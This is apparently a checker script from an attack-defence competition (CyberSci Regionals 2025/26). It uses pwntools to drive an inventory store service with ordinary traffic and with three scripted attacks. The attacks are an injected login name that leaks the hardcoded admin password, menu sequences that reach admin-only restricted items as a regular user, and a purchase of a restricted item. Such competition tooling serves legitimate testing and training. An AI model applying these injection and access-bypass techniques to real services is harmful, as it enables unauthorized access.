#!/usr/bin/python3
# -*- coding: utf8 -*-
#
# CyberSci Regionals 2025/26
#
# Inventory Attacker by Dmitriy Beryoza (0xd13a@gmail.com)

import pwn
import traceback
import random
import string
import time
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult

REQUEST_TIMEOUT = 3
MAX_RETRIES = 5
WAIT_BETWEEN_RETRIES = 3
ADMIN_PASS = "UgmD6PotMAaZ55TGqyVS"

class InventoryAttacker(Attacker):

    def __init__(self, host, port):
        super().__init__(host, port)

    def log(self, msg):
        print(msg)
        return

    def drain(self, r):
        output = r.clean(timeout=1)
        #self.log(output)
        return output

    def connect(self):
        retries = 0
        while retries < MAX_RETRIES:
            try:
                conn = pwn.remote(self.host, self.port, timeout=REQUEST_TIMEOUT, level='critical')
                #print(vars(conn))
                return conn
            except:
                retries += 1
            time.sleep(WAIT_BETWEEN_RETRIES)
            print("Retrying connection...")

        raise Exception("Service appears to be down.")

    def login_user(self, r):
        len = random.randint(10,30)
        name = ""
        for l in range(len):
            name += random.choice(string.ascii_letters + string.digits + " !@#$%^&*()_-+=[]{}|;:'/?.>,<`~")

        r.sendline(f"{name}".encode())
        output = self.drain(r)
        if f'Welcome {name}!'.encode() in output:
            return True
        return False

    def login_admin(self, r):
        r.sendline(f"admin".encode())
        output = self.drain(r)
        r.sendline(f"{ADMIN_PASS}".encode())
        output = self.drain(r)
        if f'Welcome admin!'.encode() in output:
            return True
        return False

    def benign_login(self):
        r = self.connect()

        try:
            success = False
            if random.randint(0, 1) == 0:
                if self.login_user(r):
                    success = True
            else:
                if self.login_admin(r):
                    success = True

            r.sendline(b"x")
            self.drain(r)

            if success:
                return AttackResult.RESULT_SUCCESS
            return AttackResult.RESULT_FAILURE
        finally:
            r.close()

    def malicious_login(self):
        r = self.connect()
        
        name = '"+ADMIN_PASS$+"'
        r.sendline(f"{name}".encode())
        output = self.drain(r)
        r.sendline(b"x")
        self.drain(r)
        r.close()

        if f'{ADMIN_PASS}> '.encode() in output:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def benign_browsing(self):

        r = self.connect()

        try:
            if random.randint(0, 1) == 0:
                if not self.login_user(r):
                    return AttackResult.RESULT_FAILURE
                r.sendline(b"i\x0an\x0an")
                output = self.drain(r)
                r.sendline(b"p")
                output = self.drain(r)
                r.sendline(b"x\x0ax")
                self.drain(r)
                if b'Waterproof matches' in output:
                    return AttackResult.RESULT_SUCCESS
                return AttackResult.RESULT_FAILURE
            else:
                if not self.login_admin(r):
                    return AttackResult.RESULT_FAILURE
                r.sendline(b"r\x0an")
                output = self.drain(r)
                r.sendline(b"p")
                output = self.drain(r)
                r.sendline(b"x\x0ax")
                self.drain(r)
                if b'AR-15 rifle' in output:
                    return AttackResult.RESULT_SUCCESS
                return AttackResult.RESULT_FAILURE
        finally:
            r.close()

    def malicious_browsing(self):

        r = self.connect()

        try:
            if not self.login_user(r):
                return AttackResult.RESULT_FAILURE
            r.sendline(b"i\x0an\x0ap\x0ax")
            output = self.drain(r)
            r.sendline(b"r")
            output = self.drain(r)
            r.sendline(b"x\x0ax")
            self.drain(r)
            if b'AR-15 rifle' in output:
                return AttackResult.RESULT_SUCCESS
            return AttackResult.RESULT_FAILURE
        finally:
            r.close()

    def benign_buying(self):

        r = self.connect()

        try:
            if random.randint(0, 1) == 0:
                if not self.login_user(r):
                    return AttackResult.RESULT_FAILURE
                r.sendline(b"i\x0a21")
                output = self.drain(r)
                r.sendline(b"x\x0ax")
                self.drain(r)
                if b'Give this receipt to the cashier' in output:
                    return AttackResult.RESULT_SUCCESS
                return AttackResult.RESULT_FAILURE
            else:
                if not self.login_admin(r):
                    return AttackResult.RESULT_FAILURE
                r.sendline(b"r\x0ar18")
                output = self.drain(r)
                r.sendline(b"x\x0ax")
                self.drain(r)
                if b'Give this receipt to the cashier' in output:
                    return AttackResult.RESULT_SUCCESS
                return AttackResult.RESULT_FAILURE
        finally:
            r.close()

    def malicious_buying(self):

        r = self.connect()

        try:
            if not self.login_user(r):
                return AttackResult.RESULT_FAILURE
            r.sendline(b"i\x0ar10")
            output = self.drain(r)
            r.sendline(b"x\x0ax")
            self.drain(r)
            if b'Give this receipt to the cashier' in output:
                return AttackResult.RESULT_SUCCESS
            return AttackResult.RESULT_FAILURE
        finally:
            r.close()

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.benign_login()
            elif id == 2:
                return self.benign_browsing()
            elif id == 3:
                return self.benign_buying()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))

    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.malicious_login()
            elif id == 2:
                return self.malicious_browsing()
            elif id == 3:
                return self.malicious_buying()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))